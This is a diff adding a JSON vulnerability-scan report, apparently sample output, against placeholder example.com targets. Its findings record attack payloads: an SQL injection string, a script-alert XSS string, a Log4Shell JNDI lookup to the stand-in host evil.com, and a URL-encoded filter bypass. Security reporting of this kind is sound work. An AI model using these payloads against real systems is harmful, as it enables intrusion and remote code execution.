@@ -1,0 +1,108 @@
+{
+  "report_metadata": {
+    "tool": "Dr-Sayer Security Tool",
+    "version": "1.0.0",
+    "author": "SayerLinux",
+    "email": "SayerLinux@outlook.sa",
+    "generated_at": "2026-02-25T04:30:31.959017",
+    "report_id": "671156fb"
+  },
+  "summary": {
+    "total_findings": 4,
+    "severity_breakdown": {
+      "Critical": 1,
+      "High": 2,
+      "Medium": 1,
+      "Low": 0,
+      "Info": 0
+    },
+    "testing_duration": "0:00:00.001004"
+  },
+  "findings": [
+    {
+      "type": "SQL Injection",
+      "severity": "High",
+      "description": "SQL injection vulnerability detected in parameter: id",
+      "parameter": "id",
+      "payload": "' OR 1=1--",
+      "database": "MySQL",
+      "evidence": "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version",
+      "url": "http://example.com/products.php?id=1",
+      "method": "GET",
+      "module": "SQL Injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "High",
+      "description": "XSS vulnerability found in parameter: search",
+      "parameter": "search",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "context": "exact",
+      "evidence": "<div>Search results for: <script>alert(\"XSS\")</script></div>",
+      "url": "http://example.com/search.php?q=test",
+      "method": "GET",
+      "module": "Cross-Site Scripting (XSS)"
+    },
+    {
+      "type": "Log4j Injection (CVE-2021-44228)",
+      "severity": "Critical",
+      "description": "Log4j vulnerability detected - JNDI injection possible",
+      "payload": "${jndi:ldap://evil.com/a}",
+      "location": "Header: User-Agent",
+      "evidence": "javax.naming.CommunicationException",
+      "response_time": 4.2,
+      "status_code": 500,
+      "module": "Log4j Injection (CVE-2021-44228)",
+      "cve_reference": "CVE-2021-44228"
+    },
+    {
+      "type": "WAF Bypass",
+      "severity": "Medium",
+      "description": "WAF bypass successful using encoding techniques",
+      "payload": "%3Cscript%3Ealert(%22XSS%22)%3C/script%3E",
+      "technique": "Encoding Bypass",
+      "evidence": "Payload successfully bypassed WAF filters",
+      "module": "WAF Bypass Techniques"
+    }
+  ],
+  "statistics": {
+    "total_findings": 4,
+    "type_distribution": {
+      "SQL Injection": 1,
+      "Cross-Site Scripting (XSS)": 1,
+      "Log4j Injection (CVE-2021-44228)": 1,
+      "WAF Bypass": 1
+    },
+    "most_common_types": [
+      [
+        "SQL Injection",
+        1
+      ],
+      [
+        "Cross-Site Scripting (XSS)",
+        1
+      ],
+      [
+        "Log4j Injection (CVE-2021-44228)",
+        1
+      ],
+      [
+        "WAF Bypass",
+        1
+      ]
+    ],
+    "module_distribution": {
+      "SQL Injection": 1,
+      "Cross-Site Scripting (XSS)": 1,
+      "Log4j Injection (CVE-2021-44228)": 1,
+      "WAF Bypass Techniques": 1
+    },
+    "severity_breakdown": {
+      "Critical": 1,
+      "High": 2,
+      "Medium": 1,
+      "Low": 0,
+      "Info": 0
+    }
+  }
+}
